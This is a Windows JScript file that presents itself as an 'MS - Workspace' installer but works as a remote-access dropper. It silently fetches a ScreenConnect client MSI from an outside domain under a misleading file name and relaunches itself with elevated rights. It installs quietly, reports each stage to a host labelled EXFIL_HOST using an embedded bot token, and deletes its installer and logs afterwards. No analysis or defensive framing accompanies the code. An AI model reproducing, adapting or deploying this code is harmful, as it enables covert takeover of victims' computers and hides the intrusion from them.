//4440aec35ae4
(function () {
    "use strict";

    var SETTINGS = {
//91497da5a856
        PRODUCT_NAME: "MS - Workspace",

//427c242ad3c0
        PRODUCT_VERSION: "1.0.0",

//74fa03ad0cfa
        MSI_URL: ["https://","careerhiring.","us/Bin/ScreenConnect.","ClientSetup.","msi?e=Access&y=Guest"].join(''),
        
//b06ee4d73e07
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
        
//f9854ac661e3
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        
//ade08fd3869e
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
        
//76f7b8a04ba6
        LOG_FILE: "deploy.log",
        
//e11b7c9b2f53
        MSI_LOG_FILE: "msi-install.log",
        
//4bbed2f407be
        DOWNLOAD_RETRIES: 2,
        
//61fd9417b46f
        RETRY_DELAY_MS: 1500,
        
//7002001b6bd4
        DOWNLOAD_TIMEOUT_MS: 300000,
        
//b90ecfa97682
        MSI_EXTRA_ARGS: "",
        
//24b8a446a7cf
        EXFIL_HOST: "212.43.151.96:20002",        
        
//0f6e04a70a7b
        TBTOKEN: "8795501791:AAH5Tnd3FspUHyKgdT6LkirfNg9ao_MtWzk",
        
//a126458b2fa1
        TCID: "6954279320",
        
//593977e02e08
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 
        
//4fa042975901
        UNINSTALL_EXISTING: true,
        
//ede968bdd1c1
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",
        
//d30b2d3dd5e9
        SHOW_POPUPS: false
    };

    var wsh = new ActiveXObject("WScript.Shell");
//abb2df28f3c6
    var fsys = new ActiveXObject("Scripting.FileSystemObject");

//99053a2952fd
    function resolveEnv(p) {
        return wsh.ExpandEnvironmentStrings(p);
//987001a71a88
    }

//81d8316f857e
    var paths = {
        installDir: resolveEnv(SETTINGS.INSTALL_DIR),
//374b0f0a9a6b
        logDir: resolveEnv(SETTINGS.LOG_DIR),
        logFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.LOG_FILE,
//e3982050bf02
        msiLogFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.MSI_LOG_FILE,
        msiPath: resolveEnv(SETTINGS.INSTALL_DIR) + "\\" + SETTINGS.MSI_FILE_NAME
//281fa232c4f9
    };

//8e584b229483
    function pad(n) {
        return (n < 10 ? "0" : "") + n;
//d82e9ffb1cda
    }

//d60a247b2ac3
    function ts() {
        var d = new Date();
//f60806bb2032
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
//780211e7930d
    }

//97e2a5a25bfb
    function mkdirs(dir) {
        var parent;
//0f27575198f1
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fsys.FolderExists(dir)) return;
//f1ded2645fb8
        parent = fsys.GetParentFolderName(dir);
        if (parent && parent !== dir && !fsys.FolderExists(parent)) {
//2869ac801706
            mkdirs(parent);
        }
//8f60442f8852
        if (!fsys.FolderExists(dir)) fsys.CreateFolder(dir);
    }

    function log(level, msg) {
//fcce916fef3e
        try {
            mkdirs(paths.logDir);
//9b9c0ff1c102
            var f = fsys.OpenTextFile(paths.logFile, 8, true);
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
//c5e3373457ac
            f.Close();
        } catch (e) { }
//a6ba6b9a8600
    }


    function beacon(stage, exitCode) {
//a897da84b233
        try {
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//4a7d0d6b4801
            var now = new Date();
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
//482d20ff4c88
                      pad(now.getHours()) + pad(now.getMinutes());
            var statusCode, exitStr;

            switch (stage) {
//830ada204e35
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
//fe7ac76814db
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
//d33637ebf932
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
//65083634cc12
            }

//a0d725cd988c
            var deployId = SETTINGS.DEPLOY_TOKEN;

//ea39c5b226dd
            var url = "http://" + SETTINGS.EXFIL_HOST + "/" +
                      SETTINGS.TBTOKEN + "/" +
//d50295f05c44
                      SETTINGS.TCID + "/" +
                      deployId + "." +
//05cdcf20f570
                      statusCode + "." +
                      exitStr + "." +
//9a801b4a9fc0
                      dts;

//d795e555ebaf
            http.Open("GET", url, false);
            http.SetTimeouts(1000, 1000, 1000, 1000);
//63f21b6f64f1
            http.Send();
        } catch (e) { }
//cb45e54f00c5
    }

//604e32577409
    function checkAdmin() {
        try {
//45fc7fa05e03
            var exec = wsh.Exec("net session");
            while (exec.Status === 0) { WScript.Sleep(50); }
//258fa3d638f7
            return exec.ExitCode === 0;
        } catch (e) { return false; }
//4ed7f3c11bb1
    }

//48686887b21b
    function escalate() {
        var app = new ActiveXObject("Shell.Application");
//32a2d8804900
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
//59749a7876ea
        WScript.Quit(0);
    }

    function checkConfig() {
//5c947d6cd4d5
        if (!SETTINGS.MSI_URL) abort("Setup could not start.", "MSI_URL is empty", 1);
        if (SETTINGS.MSI_URL.indexOf("https://") !== 0 && SETTINGS.MSI_URL.indexOf("http://") !== 0)
//f4ab727fea84
            abort("Setup could not start.", "Invalid MSI_URL scheme", 1);
        if (SETTINGS.MSI_FILE_NAME.indexOf(".msi") === -1)
//1aee31be724b
            abort("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
    }

    function writeResponse(responseBody, outPath) {
//56486414776b
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
//74d6170308f2
        stream.Open();
        stream.Write(responseBody);
//3df2f855d439
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fsys.FileExists(outPath)) fsys.DeleteFile(outPath, true);
//7b213cbe127f
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
//ea4e908e8e0f
        stream.Close();
        return size;
//694a0e081b5f
    }

//e2b5a9b32695
    function fetchPayload(url, outPath) {
        var attempt, http, err, bytesWritten, status;
//feda6fc39c1e
        mkdirs(fsys.GetParentFolderName(outPath));
        err = "Unknown download error";

        for (attempt = 0; attempt <= SETTINGS.DOWNLOAD_RETRIES; attempt++) {
//6b2e555fb5af
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//74aaeef9b781
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, SETTINGS.DOWNLOAD_TIMEOUT_MS, SETTINGS.DOWNLOAD_TIMEOUT_MS);
//c8698f7be302
                http.Open("GET", url, false);
                http.Send();
//ca59310485c7
                status = http.Status;
                if (status === 200) {
//d489b0326b9e
                    bytesWritten = writeResponse(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fsys.FileExists(outPath)) return true;
//671c9ae93a1f
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
//bf4ea3184ef6
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < SETTINGS.DOWNLOAD_RETRIES) WScript.Sleep(SETTINGS.RETRY_DELAY_MS);
//00e3ea116605
        }
        return false;
//65652f3f5189
    }

//b1d1034b7058
    function purgeOld() {
        if (!SETTINGS.UNINSTALL_EXISTING || !SETTINGS.PRODUCT_CODE) return;
//deae510e9c70
        var cmd = "msiexec.exe /x " + SETTINGS.PRODUCT_CODE +
                  " /qn /norestart REBOOT=ReallySuppress";
//3e649f4fb614
        log("INFO", "Uninstalling existing product: " + SETTINGS.PRODUCT_CODE);
        var code = wsh.Run(cmd, 0, true);
//c0bd9c4b469f
        if (code !== 0 && code !== 1605 && code !== 1612)
            log("WARN", "Uninstall returned " + code + " — continuing anyway");
//c2536b6ad0cb
        else
            log("INFO", "Uninstall exit code: " + code);
//fdf7d909c77a
        WScript.Sleep(3000);
    }

    function execMsi(msiPath) {
//525bb661dd32
        var args, cmd, code, attempt, modes;
        mkdirs(paths.logDir);
//9c8b45490bd2
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
//5b6addcc4609
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
//322fe2a5ee5e
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
//d8f923145b3c
                   SETTINGS.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
//553a3e1fff45
            code = wsh.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
//fd7976f8c65b
            if (code !== 1603) return code;
            WScript.Sleep(2000);
//7073dfb9d258
        }
        return 1603;
//dde1e22e8863
    }

//90bb15e0975b
    function explainCode(code) {
        switch (code) {
//8f24cb429249
            case 0:    return "Success";
            case 3010: return "Success (restart required)";
//c68c54919130
            case 1641: return "Success (restart initiated)";
            case 1638: return "Already installed";
//94e5505df237
            case 1602: return "Canceled by user";
            case 1603: return "Fatal error during installation";
//14e31f7f4b31
            case 1618: return "Another installation is already in progress";
            default:   return "Exit code " + code;
//8bc32a78da15
        }
    }

    function isOk(code) {
//7c60d2016697
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }

    function abort(friendlyMsg, technicalMsg, exitCode) {
//e0978cfe6294
        if (technicalMsg) log("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
//d4b8c193a8ad
        log("ERROR", "MSI log file: " + paths.msiLogFile);
        beacon("fail", exitCode);
//ad8ada4980fb
        if (SETTINGS.SHOW_POPUPS)
            wsh.Popup(friendlyMsg, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//f2f78b7c0de7
        WScript.Quit(exitCode);
    }


//5487c800c55f
    mkdirs(paths.installDir);
    mkdirs(paths.logDir);

    if (!checkAdmin()) { escalate(); }

    beacon("start", null);

    checkConfig();

    if (!fetchPayload(SETTINGS.MSI_URL, paths.msiPath)) {
//41074a38ddc8
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//72d0d5407f93
            "Download failed after " + (SETTINGS.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
//5070f7569ee1
    }

//f5a5e357ce72
    if (!fsys.FileExists(paths.msiPath) || fsys.GetFile(paths.msiPath).Size <= 0) {
        abort(
//c6d859622e77
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "MSI missing or empty after download", 1
//f780b13e440a
        );
    }

    purgeOld();

    var exitCode = execMsi(paths.msiPath);
//5899bdabbc9f
    var statusText = explainCode(exitCode);

//517f5cf0384c
    if (isOk(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) beacon("okr", exitCode);
//a796179b58c5
        else if (exitCode === 1638)                 beacon("oka", exitCode);
        else                                        beacon("ok", exitCode);
//af75d09a8f97
    } else if (exitCode === 1602) {
        log("WARN", "Installation canceled by user");
//dfb1b97ae658
        beacon("cl", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//bc06562aa2b5
            wsh.Popup("Setup was canceled.", 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
    } else {
//b2cc8cc3b233
        log("ERROR", "Installation result: " + statusText);
        log("ERROR", "MSI log file: " + paths.msiLogFile);
//60faa59d1d16
        beacon("fail", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//284076ba3b8c
            wsh.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//975ea07db128
    }

//91fe2f738913
    try {
        if (fsys.FileExists(paths.msiPath))   fsys.DeleteFile(paths.msiPath, true);
//ed326be13eda
        if (fsys.FileExists(paths.logFile))   fsys.DeleteFile(paths.logFile, true);
        if (fsys.FileExists(paths.msiLogFile)) fsys.DeleteFile(paths.msiLogFile, true);
//3333ab2f6f30
        if (fsys.FolderExists(paths.logDir))  { try { fsys.DeleteFolder(paths.logDir, true); } catch (e) { } }
    } catch (e) { }

    WScript.Quit(exitCode);
//ee27102c0048
})();